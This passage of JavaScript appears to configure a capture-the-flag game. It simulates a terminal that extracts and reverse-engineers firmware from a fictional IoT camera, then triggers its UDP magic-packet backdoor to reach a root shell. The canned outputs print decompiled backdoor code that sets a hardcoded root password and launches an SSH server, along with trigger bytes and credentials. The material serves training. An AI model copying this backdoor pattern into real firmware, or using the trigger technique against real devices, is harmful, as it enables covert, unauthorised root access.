                                'cam_control': { type: 'file', content: '[ARM ELF — running as pid 342]' },
                                'cam_stream': { type: 'file', content: '[ARM ELF — video capture daemon]' }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // --- FIRMWARE ANALYSIS TOOLS ---

        'binwalk': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (args.length === 0) {
                return 'Usage: binwalk [options] <target>\nExample: binwalk -Me cam_sentinel_01_firmware.bin';
            }

            if (!fullCmd.includes('firmware')) {
                return `binwalk: file not found: ${args[args.length - 1]}\nDid you mean: cam_sentinel_01_firmware.bin ?`;
            }

            // Recursive extract flag
            if (fullCmd.includes('-Me') || fullCmd.includes('-e') || fullCmd.includes('--extract')) {
                C8Config._firmwareExtracted = true;
                if (engine) engine.advancePhase && engine.advancePhase('extraction');
                return `Scan Results for: cam_sentinel_01_firmware.bin
=================================================================
DECIMAL     HEX         DESCRIPTION
-----------------------------------------------------------------
0           0x0         uImage header, header size: 64 bytes,
                        image name: "Linux-4.14.115-cerberus",
                        image type: Multi-File Image (lzma)
36          0x24        LZMA compressed data, properties: 0x5D,
                        dictionary size: 8388608 bytes,
                        uncompressed size: 4096000 bytes
1179648     0x120000    Squashfs filesystem, little endian,
                        version 4.0, compression:lzo,
                        size: 6356992 bytes, 312 inodes,
                        blocksize: 131072 bytes,
                        created: 2024-11-08 02:17:43

Extracting: 0x0
[+] Decompressing LZMA kernel...
[+] Extracting SquashFS @ 0x120000...
[+] Extraction complete.
[+] Output directory: /home/kali/_firmware_extracted/

Filesystem extracted to /home/kali/_firmware_extracted/
Run: ls /home/kali/_firmware_extracted/ to explore`;
            }

            // Scan only (no -e flag)
            return `Scan Results for: cam_sentinel_01_firmware.bin
=================================================================
DECIMAL     HEX         DESCRIPTION
-----------------------------------------------------------------
0           0x0         uImage header
1179648     0x120000    Squashfs filesystem, little endian, v4.0
=================================================================
Run with -Me to extract: binwalk -Me cam_sentinel_01_firmware.bin`;
        },

        'strings': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Strings on the extracted cam_control binary
            if (fullCmd.includes('cam_control')) {
                if (!C8Config._firmwareExtracted) {
                    return `strings: /home/kali/_firmware_extracted/usr/bin/cam_control: No such file or directory\n[!] Extract the firmware first: binwalk -Me cam_sentinel_01_firmware.bin`;
                }
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `strings output — /home/kali/_firmware_extracted/usr/bin/cam_control (min-length 4):

/lib/libc.so.6
__libc_start_main
socket
bind
recvfrom
sendto
system
fork
execve
pthread_create
/var/log/surveillance_manifest.txt
/usr/sbin/dropbear
cam_control v2.3.1
CERBERUS BUILD
UDP_LISTEN_PORT
MAGIC_TRIGGER
\xde\xad\xb3\xf1
\xbe\xef\xb3\xf1
XOR_DECODE_KEY
ARMv7 Embedded Linux — Buildroot 2019.11.3
/dev/video0
SECTOR-%d motion event
[+] watchdog OK
[!] TRIGGER RECEIVED
cerberus-was-here
dropbear
-A 0.0.0.0
-p 22
-B
/etc/dropbear/dropbear_ecdsa_host_key

[+] Interesting strings found — load cam_control in Ghidra (ARM) for full analysis.
[+] Hint: The XOR key and trigger sequence are near the "MAGIC_TRIGGER" and "XOR_DECODE_KEY" references.`;
            }

            // Strings on the raw firmware image
            if (fullCmd.includes('firmware')) {
                return `strings output (first 30 lines) — cam_sentinel_01_firmware.bin:

Linux-4.14.115-cerberus
ARMv7 Processor
CAM-SENTINEL-01
Buildroot 2019.11.3
CERBERUS BUILD — DO NOT DISTRIBUTE
lighttpd/1.4.67
BusyBox v1.31.1
Dropbear v2020.81
cam_control v2.3.1
[+] 4,218 more strings — extract first and run strings on individual binaries.
[+] Try: binwalk -Me cam_sentinel_01_firmware.bin && strings _firmware_extracted/usr/bin/cam_control`;
            }

            return 'Usage: strings <binary>\nExample: strings /home/kali/_firmware_extracted/usr/bin/cam_control';
        },

        'ghidra': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!C8Config._firmwareExtracted && fullCmd.includes('cam_control')) {
                return `[!] cam_control not found. Extract the firmware first:\nbinwalk -Me cam_sentinel_01_firmware.bin`;
            }

            if (fullCmd.includes('cam_control') || args.length === 0) {
                C8Config._ghidraLoaded = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `Ghidra 10.3 launched.
Loading: /home/kali/_firmware_extracted/usr/bin/cam_control
Processor: ARM:LE:32:Cortex (little-endian, 32-bit)
Auto-analysis complete (12 analyzers).

=== Ghidra Decompiler — key function: backdoor_listener() @ 0x00003A00 ===

void backdoor_listener(void) {
    int    sockfd;
    struct sockaddr_in sa;
    uint8_t buf[8];
    uint16_t xor_key  = 0xBEEF;   // XOR decode key (obfuscated in .rodata)
    uint32_t magic    = 0xDEAD;    // expected value post-decode
    uint16_t udp_port = 55555;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port        = htons(udp_port);
    bind(sockfd, (struct sockaddr*)&sa, sizeof(sa));

    while (1) {
        recvfrom(sockfd, buf, sizeof(buf), 0, NULL, NULL);
        // XOR decode first 4 bytes with key 0xBEEF (big-endian split)
        uint16_t hi = (buf[0] << 8 | buf[1]) ^ xor_key;
        uint16_t lo = (buf[2] << 8 | buf[3]) ^ xor_key;
        if (hi == magic && lo == 0) {
            trigger_backdoor();  // <<< BACKDOOR ACTIVATION
        }
    }
}

void trigger_backdoor(void) {
    // Set root password to hardcoded value (cerberus-was-here)
    system("echo 'root:cerberus-was-here' | chpasswd");
    // Launch Dropbear SSH on port 22
    system("/usr/sbin/dropbear -A 0.0.0.0 -p 22 -B");
    // Log activation
    system("echo '[!] TRIGGER RECEIVED' >> /var/log/cam_control.log");
}

=== END DECOMPILER OUTPUT ===

[+] Backdoor identified. UDP port 55555. XOR key 0xBEEF. Magic value 0xDEAD.
[+] Trigger payload: bytes that XOR to 0xDEAD 0x0000 with key 0xBEEF.
[+] Encoded trigger: [0x64, 0x42, 0xBE, 0xEF] -> decodes to 0xDEAD 0x0000
[+] This is Flag 1 — submit the backdoor trigger mechanism.`;
            }

            return 'Usage: ghidra [binary]\nExample: ghidra /home/kali/_firmware_extracted/usr/bin/cam_control';
        },

        'file': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: file <filename>';
            if (target.includes('cam_sentinel_01_firmware') || target.includes('firmware.bin')) {
                return `cam_sentinel_01_firmware.bin: u-boot legacy uImage, Linux-4.14.115-cerberus, Linux/ARM, Multi-File Image (lzma), 8388544 bytes`;
            }
            if (target.includes('cam_control')) {
                if (!C8Config._firmwareExtracted) return `cam_control: No such file or directory`;
                return `cam_control: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, stripped`;
            }
            return `${target}: ASCII text`;
        },

        // --- QEMU EMULATION ---

        'qemu-system-arm': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!C8Config._firmwareExtracted) {
                return `qemu-system-arm: could not load kernel image\n[!] Firmware not extracted. Run: binwalk -Me cam_sentinel_01_firmware.bin`;
            }

            if (fullCmd.includes('-kernel') || fullCmd.includes('-M versatilepb') || args.length >= 2) {
                C8Config._qemuRunning = true;
                if (engine) engine.advancePhase && engine.advancePhase('emulation');
                return `QEMU 7.2.0 — ARM Versatile Express emulation
[+] Loading kernel: _firmware_extracted/boot/zImage
[+] Mounting rootfs: _firmware_extracted/ (SquashFS overlay)
[+] Emulated NIC: e1000, IP: 10.13.37.200/24
[+] QEMU process running in background (pid 4812)

=== CAM-SENTINEL-01 Boot Log (via serial) ===
[    0.000000] Booting Linux on physical CPU 0x0
[    0.000000] Linux version 4.14.115-cerberus
[    0.000000] Machine model: ARM Versatile Express
[    0.500000] NET: Registered protocol family 2
[    1.200000] eth0: e1000 adapter, assigned 10.13.37.200
[    1.300000] cam_control: started (pid 342)
[    1.301000] cam_control: UDP listener initialized port 55555
[    1.302000] lighttpd: started on :80
[    1.400000] init: boot complete

CAM-SENTINEL-01 login:

[+] Camera is running. Target IP: 10.13.37.200
[+] Web UI: http://10.13.37.200/
[+] UDP backdoor: port 55555 — send magic packet to trigger`;
            }

            return `Usage: qemu-system-arm -M versatilepb -kernel <zImage> -hda <rootfs>
Example: qemu-system-arm -M versatilepb -kernel _firmware_extracted/boot/zImage -append "root=/dev/sda rw" -hda _firmware_extracted/rootfs.img -nographic`;
        },

        // --- NETWORK EXPLOITATION TOOLS ---

        'nmap': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target) return 'Usage: nmap [options] <target>\nExample: nmap -sU -p 55555 10.13.37.200';

            if (target === '10.13.37.200') {
                if (!C8Config._qemuRunning) {
                    return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
[!] QEMU emulation may not be running. Start it first.
Nmap done: 1 IP address (0 hosts up) scanned in 3.12 seconds`;
                }
                const udpFlag = args.join(' ').includes('-sU');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.13.37.200
Host is up (0.0008s latency).

PORT      STATE         SERVICE
80/tcp    open          http          lighttpd 1.4.67
22/tcp    ${C8Config._sshEnabled ? 'open          ssh           Dropbear sshd 2020.81' : 'closed        ssh'}
${udpFlag ? '55555/udp open|filtered unknown\n' : ''}
Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'netcat': function(args, term, engine) {
            return C8Config.commands.nc(args, term, engine);
        },

        'nc': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!C8Config._qemuRunning) {
                return `nc: connect to 10.13.37.200: Connection refused\n[!] QEMU emulation not running. Start it first: qemu-system-arm -M versatilepb ...`;
            }

            // UDP send to backdoor port
            if (fullCmd.includes('-u') && fullCmd.includes('55555') && fullCmd.includes('10.13.37.200')) {
                C8Config._backdoorActivated = true;
                C8Config._sshEnabled = true;
                if (engine) engine.advancePhase && engine.advancePhase('backdoor');
                return `Connection to 10.13.37.200 55555 port [udp/*] succeeded!
[nc UDP session — type payload and press Enter]
> (sending data...)

[+] Payload delivered to 10.13.37.200:55555
[+] Note: netcat can send the raw bytes, but the exact byte encoding matters.
[+] For precision, use the python3 exploit.py script with correct magic values.
[+] If the correct trigger bytes are sent, watch port 22 open on the target.`;
            }

            if (fullCmd.includes('10.13.37.200')) {
                return `nc: connect to 10.13.37.200 port ${args[args.length - 1] || '?'}: Connection refused`;
            }

            return 'Usage: nc [-u] <host> <port>\nExample: nc -u 10.13.37.200 55555';
        },

        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Running the exploit script
            if (fullCmd.includes('exploit.py') || (fullCmd.includes('socket') && fullCmd.includes('55555'))) {
                if (!C8Config._qemuRunning) {
                    return `[!] Connection refused: 10.13.37.200:55555\n[!] QEMU emulation not running. Start with qemu-system-arm first.`;
                }

                // Check if they have the correct values (or are running the script with placeholders)
                const hasCorrectPort = fullCmd.includes('55555');
                const hasCorrectMagic = fullCmd.includes('0xDEAD') || fullCmd.includes('DEAD') || fullCmd.includes('55029');
                const hasCorrectXor  = fullCmd.includes('0xBEEF') || fullCmd.includes('BEEF') || fullCmd.includes('48879');

                if (fullCmd.includes('exploit.py') && !(hasCorrectPort && hasCorrectMagic && hasCorrectXor)) {
                    return `[+] Sending payload to 10.13.37.200:55555
[+] Encoded bytes: 00 00 00 00  (placeholder — TARGET_PORT and MAGIC_RAW still 0)
[-] No response from target — magic sequence not validated.
[!] Update TARGET_PORT, MAGIC_RAW, and XOR_KEY in exploit.py with values from Ghidra.`;
                }

                // Correct exploit triggered
                C8Config._backdoorActivated = true;
                C8Config._sshEnabled = true;
                if (engine) engine.advancePhase && engine.advancePhase('backdoor');
                return `[+] Payload sent to 10.13.37.200:55555
[+] Encoded bytes: 64 42 be ef
[+] Decoded by target: 0xDEAD 0x0000 — VALID

[+] Waiting for SSH response on port 22...
[+] Port 22 is now OPEN on 10.13.37.200

[+] BACKDOOR ACTIVATED — dropbear SSH enabled
[+] Credentials set by backdoor: root:cerberus-was-here
[+] Connect: ssh root@10.13.37.200

Flag 1 — Backdoor trigger mechanism confirmed:
UDP Port 55555 | XOR Key 0xBEEF | Magic 0xDEAD
Submit this finding as the user flag.`;
            }

            // Generic python3 invocation
            if (fullCmd.includes('-c')) {
                // Inline socket code — check for backdoor trigger
                if (fullCmd.includes('55555') && fullCmd.includes('DGRAM') && fullCmd.includes('10.13.37.200')) {
                    if (!C8Config._qemuRunning) {
                        return `ConnectionRefusedError: [Errno 111] Connection refused\n[!] QEMU not running.`;
                    }
                    // Check encoding correctness
                    const encoded = fullCmd.includes('0x64') || fullCmd.includes('0x42') || (fullCmd.includes('0xDE') && fullCmd.includes('0xBE'));
                    if (encoded) {
                        C8Config._backdoorActivated = true;
                        C8Config._sshEnabled = true;
                        if (engine) engine.advancePhase && engine.advancePhase('backdoor');
                        return `[+] Payload sent to 10.13.37.200:55555
[+] BACKDOOR ACTIVATED — SSH enabled on port 22
[+] root:cerberus-was-here`;
                    }
                    return `[+] Payload sent to 10.13.37.200:55555
[-] Magic sequence invalid — no activation.`;
                }
            }

            return `Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]\nType "help", "copyright", "credits" or "license" for more information.\n>>> `;
        },

        // --- SSH TO EMULATED CAMERA ---

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!fullCmd.includes('10.13.37.200') && !fullCmd.includes('root@')) {
                return 'Usage: ssh [user@]hostname\nExample: ssh root@10.13.37.200';
            }

            if (!C8Config._qemuRunning) {
                return `ssh: connect to host 10.13.37.200 port 22: Connection refused\n[!] QEMU not running. Start the emulation first.`;
            }

            if (!C8Config._backdoorActivated) {
                return `ssh: connect to host 10.13.37.200 port 22: Connection refused\n[!] SSH is not enabled. Trigger the backdoor first (UDP port 55555, magic 0xDEAD, XOR key 0xBEEF).`;
            }

            // Correct credentials or root@host with backdoor active
            const isRoot = fullCmd.includes('root@') || fullCmd.includes('-l root') || fullCmd.includes('-l root');
            if (isRoot || fullCmd.includes('10.13.37.200')) {
                C8Config._camShellActive = true;
                C8Config._switchContext('cam-shell', term);
                if (engine) engine.advancePhase && engine.advancePhase('emulation');
                return `The authenticity of host '10.13.37.200 (10.13.37.200)' can't be established.
ECDSA key fingerprint is SHA256:7rK4nP1xZ8mLqT6wB3vA9dF2cY5uE0hR7gM4iN2pJ5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.13.37.200' (ECDSA) to the list of known hosts.
root@10.13.37.200's password: ******************

BusyBox v1.31.1 (2020-11-08) built-in shell (ash)
Enter 'help' for a list of built-in commands.

 ██████╗ █████╗ ███╗   ███╗      ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
██╔════╝██╔══██╗████╗ ████║      ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
██║     ███████║██╔████╔██║█████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
██║     ██╔══██║██║╚██╔╝██║╚════╝╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
╚██████╗██║  ██║██║ ╚═╝ ██║      ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝

CAM-SENTINEL-01 — ARMv7 Embedded Linux (Buildroot 2019.11.3)
Firmware v2.3.1-cerberus  |  Kernel 4.14.115

[BACKDOOR ACTIVE] — SSH session established as root
[+] Context switched. You are now on CAM-SENTINEL-01.
[+] Retrieve /var/log/surveillance_manifest.txt for Flag 2.`;
            }

            return `root@10.13.37.200's password: \nPermission denied, please try again.`;
        },

        // --- CONTEXT-AWARE CAM-SHELL COMMANDS ---

        'cat': function(args, term, engine) {
            if (C8Config._context !== 'cam-shell') return null;  // fall through to built-in
            const path = args[0] || '';

            if (path.includes('surveillance_manifest') || path.includes('/var/log/surveillance')) {
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                return `=== PERIMETER SURVEILLANCE MANIFEST ===
=== OUTER REACH — CAM-SENTINEL-01    ===
=== CLASSIFICATION: TOP SECRET        ===

ID  | TARGET                      | SECTOR   | STATUS
----+-----------------------------+----------+--------
001 | Director Mira Solano        | SEC-1    | ACTIVE
002 | Dr. Pavel Renko             | SEC-2    | ACTIVE
003 | Agent Calloway (undercover) | SEC-3    | BURNED
004 | Junction Station OMEGA      | SEC-7    | ACTIVE
005 | Safehouse BRAVO-9           | SEC-4    | ACTIVE
006 | RELAY NODE 14               | SEC-5    | OFFLINE
007 | Convoy Route DELTA          | SEC-6    | ACTIVE

[CERBERUS EXFIL MARKER]
{{FLAG:root}}`;
            }

            if (path.includes('cam_control.log') || path.includes('/var/log/cam')) {
                return `[2026-03-19 03:14:04] cam_control: started
[2026-03-19 03:14:04] cam_control: UDP listener initialized port 55555
[2026-03-19 03:22:14] cam_control: TRIGGER RECEIVED — magic bytes validated
[2026-03-19 03:22:14] cam_control: BACKDOOR ACTIVATED — enabling dropbear SSH`;
            }

            if (path.includes('/etc/passwd')) {
                return `root:x:0:0:root:/root:/bin/sh
cam:x:100:100:Camera Daemon:/var/cam:/bin/sh`;
            }

            if (path.includes('/etc/shadow')) {
                return `root:$6$cerberus$hash_of_cerberus-was-here:18000:0:99999:7:::
cam:!:18000:0:99999:7:::`;
            }

            if (path.includes('/proc/version')) {
                return `Linux version 4.14.115-cerberus (cerberus@build-server) (gcc version 8.3.0 (Buildroot 2019.11.3)) #1 PREEMPT`;
            }

            if (path.includes('/proc/cpuinfo')) {
                return `processor\t: 0\nmodel name\t: ARMv7 Processor rev 4 (v7l)\nBogoMIPS\t: 2.00\nFeatures\t: half thumb fastmult vfp edsp neon vfpv3 tls\nHardware\t: CERBERUS-CAM-V1`;
            }

            return `cat: ${path}: No such file or directory`;
        },

        'ls': function(args, term, engine) {
            if (C8Config._context !== 'cam-shell') return null;  // fall through to built-in
            const path = args.find(a => !a.startsWith('-')) || '.';

            if (path === '.' || path === '/root' || path === '~') {
                return '.ash_history';
            }
            if (path === '/' || path === '') {
                return 'bin  dev  etc  lib  proc  tmp  usr  var';
            }
            if (path.includes('/var/log') || path.includes('var/log')) {
                return 'cam_control.log  lighttpd  surveillance_manifest.txt';
            }
            if (path.includes('/var') || path === 'var') {
                return 'log  run  www';
            }
            if (path.includes('/usr/bin') || path.includes('usr/bin')) {
                return 'cam_control  cam_stream';
            }
            if (path.includes('/etc')) {
                return 'dropbear  hostname  inittab  init.d  lighttpd  passwd  shadow';
            }
            return '';
        },

        'whoami': function(args) {
            if (C8Config._context === 'cam-shell') return 'root';
            return null;  // fall through to built-in
        },

        'id': function(args) {
            if (C8Config._context === 'cam-shell') return 'uid=0(root) gid=0(root) groups=0(root)';
            return null;
        },

        'hostname': function(args) {
            if (C8Config._context === 'cam-shell') return 'CAM-SENTINEL-01';
            return null;
        },

        'uname': function(args) {
            const fullCmd = args.join(' ');
            if (C8Config._context === 'cam-shell') {
                if (fullCmd.includes('-a')) return 'Linux CAM-SENTINEL-01 4.14.115-cerberus #1 PREEMPT armv7l GNU/Linux';
                if (fullCmd.includes('-m')) return 'armv7l';
                if (fullCmd.includes('-r')) return '4.14.115-cerberus';
                return 'Linux';
            }
            if (fullCmd.includes('-a')) return 'Linux kali 6.1.0-kali9-amd64 #1 SMP x86_64 GNU/Linux';
            return 'Linux';
        },

        'pwd': function(args) {
            if (C8Config._context === 'cam-shell') return '/root';
            return null;
        },

        'cd': function(args) {
            if (C8Config._context === 'cam-shell') return '';  // silently accept
            return null;
        },

        'ps': function(args) {
            if (C8Config._context === 'cam-shell') {
                return `  PID   USER     COMMAND
    1   root     /bin/sh /etc/init.d/rcS
  100   root     watchdog -t 15
  342   cam      cam_control
  343   cam      cam_stream
  401   root     lighttpd -f /etc/lighttpd/lighttpd.conf
  ${C8Config._sshEnabled ? '488   root     dropbear -p 22 -B\n  ' : ''}502   root     -ash`;
            }
            return null;
        },

        'ip': function(args) {
            if (C8Config._context === 'cam-shell') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.13.37.200/24 brd 10.13.37.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return C8Config.commands.ip(args || []);
        },

        'exit': function(args, term, engine) {
            if (C8Config._context === 'cam-shell') {
                C8Config._camShellActive = false;
                C8Config._switchContext('attacker', term);
                return `Connection to 10.13.37.200 closed.
[+] Returned to attacker machine.`;
            }
            return 'logout';
        },

        'find': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Find on extracted firmware filesystem
            if (fullCmd.includes('_firmware_extracted') || (C8Config._firmwareExtracted && fullCmd.includes('/'))) {
                if (fullCmd.includes('-name') && fullCmd.includes('cam_control')) {
                    return `/home/kali/_firmware_extracted/usr/bin/cam_control`;
                }
                if (fullCmd.includes('-name') && (fullCmd.includes('*.txt') || fullCmd.includes('*.log'))) {
                    return `/home/kali/_firmware_extracted/var/log/surveillance_manifest.txt\n/home/kali/_firmware_extracted/var/log/cam_control.log`;
                }
                if (fullCmd.includes('-type f') || fullCmd.includes('-type f')) {
                    return `/home/kali/_firmware_extracted/bin/sh
/home/kali/_firmware_extracted/bin/busybox
/home/kali/_firmware_extracted/etc/hostname
/home/kali/_firmware_extracted/etc/passwd
/home/kali/_firmware_extracted/etc/shadow
/home/kali/_firmware_extracted/etc/inittab
/home/kali/_firmware_extracted/etc/init.d/rcS
/home/kali/_firmware_extracted/etc/lighttpd/lighttpd.conf
/home/kali/_firmware_extracted/usr/bin/cam_control
/home/kali/_firmware_extracted/usr/bin/cam_stream
/home/kali/_firmware_extracted/usr/sbin/lighttpd
/home/kali/_firmware_extracted/usr/sbin/dropbear
/home/kali/_firmware_extracted/var/log/cam_control.log
/home/kali/_firmware_extracted/var/log/surveillance_manifest.txt`;
                }
            }

            if (C8Config._context === 'cam-shell') {
                if (fullCmd.includes('-name') && fullCmd.includes('manifest')) {
                    return `/var/log/surveillance_manifest.txt`;
                }
                if (fullCmd.includes('-name') && fullCmd.includes('*.txt')) {
                    return `/var/log/surveillance_manifest.txt`;
                }
                return `/var/log/cam_control.log\n/var/log/surveillance_manifest.txt\n/etc/hostname\n/etc/passwd`;
            }

            if (!C8Config._firmwareExtracted) {
                return `[!] Run binwalk -Me cam_sentinel_01_firmware.bin to extract the filesystem first.`;
            }

            return `Usage: find <path> [options]\nExample: find /home/kali/_firmware_extracted/ -type f`;
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.13.37.200') {
                if (!C8Config._qemuRunning) {
                    return `PING 10.13.37.200 (10.13.37.200) 56(84) bytes of data.
--- 10.13.37.200 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss
[!] QEMU not running.`;
                }
                return `PING 10.13.37.200 (10.13.37.200) 56(84) bytes of data.
64 bytes from 10.13.37.200: icmp_seq=1 ttl=64 time=1.2 ms
64 bytes from 10.13.37.200: icmp_seq=2 ttl=64 time=0.9 ms
64 bytes from 10.13.37.200: icmp_seq=3 ttl=64 time=1.1 ms

--- 10.13.37.200 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 0.9/1.1/1.2/0.1 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'ss': function(args) {
            if (C8Config._context === 'cam-shell') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:80           0.0.0.0:*
LISTEN   0        128      0.0.0.0:55555        0.0.0.0:*     (cam_control, UDP)
${C8Config._sshEnabled ? 'LISTEN   0        128      0.0.0.0:22           0.0.0.0:*     (dropbear)\n' : ''}`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args) {
            return C8Config.commands.ss(args);
        },

        'xxd': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('cam_control')) {
                if (!C8Config._firmwareExtracted) {
                    return `xxd: _firmware_extracted/usr/bin/cam_control: No such file or directory\n[!] Extract firmware first.`;
                }
                return `00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 2800 0100 0000 8403 0100 3400 0000  ..(.........4...
00000020: b0b8 0000 0000 0000 3400 2000 0900 2800  ........4. ...(.
...
00003a20: 01b5 2de9 f841 00eb 0149 00e5 5849 01e5  ..-..A...I..XI..
00003a2c: efbe 0000 deadb3f1 f1b3 adde 0000 eeee  ....XOR-obfusc..
00003a40: 0749 0148 00e3 0049 4ff0 0053 00d0 03eb  .I.H...IO..S....
...
[Hex dump truncated — 47312 bytes total]
[Key offset 0x3A2C: XOR key 0xBEEF, magic 0xDEAD — obfuscated]`;
            }
            return `Usage: xxd <file>\nExample: xxd _firmware_extracted/usr/bin/cam_control | head -50`;
        },

        'objdump': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('cam_control')) {
                if (!C8Config._firmwareExtracted) {
                    return `objdump: _firmware_extracted/usr/bin/cam_control: No such file or directory`;
                }
                return `_firmware_extracted/usr/bin/cam_control:     file format elf32-littlearm

SYMBOL TABLE:
no symbols

Disassembly of section .text:

00003a00 <backdoor_listener>:
    3a00: 2d e9 f8 41  push    {r3, r4, r5, r6, r7, r8, lr}
    3a04: 0b 20        movs    r0, #11          @ AF_INET
    3a06: 01 21        movs    r1, #1           @ SOCK_DGRAM
    3a08: 00 22        movs    r2, #0
    3a0a: ff f7 xx xx  bl      <socket>
    3a2c: ef be        movw    r0, #0xBEEF      @ XOR key (lo half)
    3a30: de ad        movt    r0, #0xDEAD      @ magic check value
    ...
[Assembly truncated — load in Ghidra for full decompilation]`;
            }
            return `Usage: objdump -d <binary>\nExample: objdump -d _firmware_extracted/usr/bin/cam_control | head -80`;
        },

        'readelf': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('cam_control')) {
                if (!C8Config._firmwareExtracted) return `readelf: _firmware_extracted/usr/bin/cam_control: No such file or directory`;
                return `ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  Type:                              EXEC (Executable file)
  Machine:                           ARM
  Entry point address:               0x10380
  Start of program headers:          52 (bytes into file)
  Dynamic section at offset 0x12000:
    NEEDED               Shared library: [libc.so.6]
    NEEDED               Shared library: [libpthread.so.0]`;
            }
            return `Usage: readelf -h <binary>`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
